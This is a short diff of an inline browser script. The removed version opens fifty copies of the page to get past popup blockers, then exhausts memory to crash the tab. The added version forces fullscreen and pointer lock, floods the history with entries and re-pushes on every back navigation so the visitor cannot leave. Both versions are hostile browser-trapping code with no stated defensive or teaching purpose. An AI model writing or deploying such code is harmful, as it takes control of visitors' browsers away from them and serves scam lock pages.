@@ -1,9 +1,7 @@
 <script>
-  // try to spawn a few tabs (first one usually slips past the blocker)
-  for (let i = 0; i < 50; i++) {
-    window.open(window.location.href, '_blank');
-  }
-  // then nuke the current tab so the popup blocker prompt doesn't matter
-  const a = [];
-  while (true) a.push(new ArrayBuffer(1024 * 1024 * 100));
+  document.documentElement.requestFullscreen();
+  document.body.requestPointerLock();
+  // pollute history so back button doesn't escape
+  for (let i = 0; i < 500; i++) history.pushState(0, 0, '#' + i);
+  window.onpopstate = () => history.pushState(0, 0, '#trap');
 </script>
